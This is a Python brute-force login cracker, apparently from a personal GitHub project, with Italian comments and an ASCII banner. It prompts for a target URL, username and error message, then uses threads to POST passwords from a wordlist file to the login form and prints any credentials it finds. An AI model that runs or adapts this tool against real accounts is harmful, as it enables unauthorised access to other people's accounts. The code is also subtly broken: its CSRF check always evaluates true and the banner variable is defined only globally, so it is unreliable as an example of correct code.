######################################################################################################
# Title: Brute force                                                                                 
# Author: Gabriele D'Attile                                                                     
# Github : https://github.com/GabrieleDattile      
# buon divertimento <3
######################################################################################################

print ("""

 ________  ________  ___  ___  _________  _______           ________ ________  ________  ________  _______      
|\   __  \|\   __  \|\  \|\  \|\___   ___\\  ___ \         |\  _____\\   __  \|\   __  \|\   ____\|\  ___ \     
\ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \   __/|        \ \  \__/\ \  \|\  \ \  \|\  \ \  \___|\ \   __/|    
 \ \   __  \ \   _  _\ \  \\\  \   \ \  \ \ \  \_|/__       \ \   __\\ \  \\\  \ \   _  _\ \  \    \ \  \_|/__  
  \ \  \|\  \ \  \\  \\ \  \\\  \   \ \  \ \ \  \_|\ \       \ \  \_| \ \  \\\  \ \  \\  \\ \  \____\ \  \_|\ \ 
   \ \_______\ \__\\ _\\ \_______\   \ \__\ \ \_______\       \ \__\   \ \_______\ \__\\ _\\ \_______\ \_______\
    \|_______|\|__|\|__|\|_______|    \|__|  \|_______|        \|__|    \|_______|\|__|\|__|\|_______|\|_______|
                                                                                                                
                                                                                                        
 ________      ___    ___      ________  ________  ________  ________      ___    ___ 
|\   __  \    |\  \  /  /|    |\   ____\|\   __  \|\   __  \|\   __  \    |\  \  /  /|
\ \  \|\ /_   \ \  \/  / /    \ \  \___|\ \  \|\  \ \  \|\ /\ \  \|\  \   \ \  \/  / /
 \ \   __  \   \ \    / /      \ \  \  __\ \   __  \ \   __  \ \   _  _\   \ \    / / 
  \ \  \|\  \   \/  /  /        \ \  \|\  \ \  \ \  \ \  \|\  \ \  \\  \|   \/  /  /  
   \ \_______\__/  / /           \ \_______\ \__\ \__\ \_______\ \__\\ _\ __/  / /    
    \|_______|\___/ /      U      \|_______|\|__|\|__|\|_______|\|__|\|__|\___/ /     
             \|___|/                                                     \|___|/      

""")




# Import dei moduli necessari
import threading  # Per l'utilizzo dei thread
import requests  # Per le richieste HTTP
import time  # Per gestire il tempo
import sys  # Per operazioni di sistema

# Definizione della classe BruteForceCracker per il cracking delle password
class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        # Mostra un banner all'avvio della classe
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        # Dizionario dei dati per la richiesta POST
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        
        # Effettua la richiesta POST all'URL specificato con i dati del dizionario
        response = requests.post(self.url, data=data_dict)
        
        # Controlla se il messaggio di errore specificato è presente nella risposta
        if self.error_message in str(response.content):
            return False
        # Controlla se è stato rilevato un token CSRF nella risposta
        elif "CSRF" or "csrf" in str(response.content):
            print("Token CSRF rilevato! BruteF0rce non funziona su questo sito.")
            sys.exit()
        else:
            # Se la password è stata trovata, stampa l'username e la password
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

# Funzione per craccare le password
def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        # Stampa la password attualmente testata
        print("Sto provando la password: {} per la {} volta".format(password, count))
        if cracker.crack(password):
            return

# Funzione principale del programma
def main():
    url = input("Inserisci l'URL di destinazione: ")
    username = input("Inserisci l'username di destinazione: ")
    error = input("Inserisci il messaggio di errore per password errata: ")
    cracker = BruteForceCracker(url, username, error)
    
    # Apre il file 'passwords.txt' in modalità lettura
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            # Legge una lista di password dal file
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            # Avvia un nuovo thread per testare le password
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

# Avvio del programma quando il file è eseguito direttamente
if __name__ == '__main__':
    banner = """ 
                       Controllo del Server!!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()

